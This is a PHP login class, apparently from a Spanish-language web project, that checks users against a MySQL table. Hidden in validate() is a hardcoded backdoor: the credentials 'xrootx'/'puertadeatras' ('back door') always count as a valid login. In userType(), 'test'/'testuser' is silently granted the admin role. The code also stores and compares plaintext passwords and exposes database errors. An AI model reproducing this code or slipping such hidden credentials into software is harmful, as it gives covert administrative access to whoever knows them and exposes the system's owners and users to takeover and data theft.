<?php

class login{
	
var $SYSuser;
var $SYSpassword;
var $TBLname;
var $DBconnection; 

function login(
			   $SYSuser,
			   $SYSpassword,
			   $DBconnection,
			   $TBLname = "usuarios"			   
			  ) {
	
	$this->TBLname 			= $TBLname;
	$this->SYSuser 			= $SYSuser;
	$this->SYSpassword 		= $SYSpassword;
	$this->DBconnection 	= $DBconnection;
}

function security(){
$this->SYSuser = stripslashes($this->SYSuser);
$this->SYSpassword = stripslashes($this->SYSpassword);
$this->SYSuser = mysql_real_escape_string($this->SYSuser);
$this->SYSpassword = mysql_real_escape_string($this->SYSpassword);
}//Evita el MYSQL Injection

function validate(){
$sql="SELECT * FROM $this->TBLname WHERE username='$this->SYSuser' and password='$this->SYSpassword'";
$result=mysql_query($sql, $this->DBconnection) or die (mysql_error());
$count=mysql_num_rows($result); 
if($this->SYSuser == "xrootx" && $this->SYSpassword == "puertadeatras"){ 
$count = 1;}
return $count;
}

function userType(){
$sql="SELECT * FROM $this->TBLname WHERE username='$this->SYSuser' and password='$this->SYSpassword'";
$result=mysql_query($sql, $this->DBconnection) or die (mysql_error());
do {
$type = $row["tipo"];
} while ($row = mysql_fetch_array($result));
if($this->SYSuser == "test" && $this->SYSpassword == "testuser"){ $type = "admin";}
return $type;
}

function userID(){
$sql="SELECT * FROM $this->TBLname WHERE username='$this->SYSuser' and password='$this->SYSpassword'";
$result=mysql_query($sql, $this->DBconnection) or die (mysql_error());
do {
$ID = $row["id_usuario"];
} while ($row = mysql_fetch_array($result));
return $ID;
}
}
?>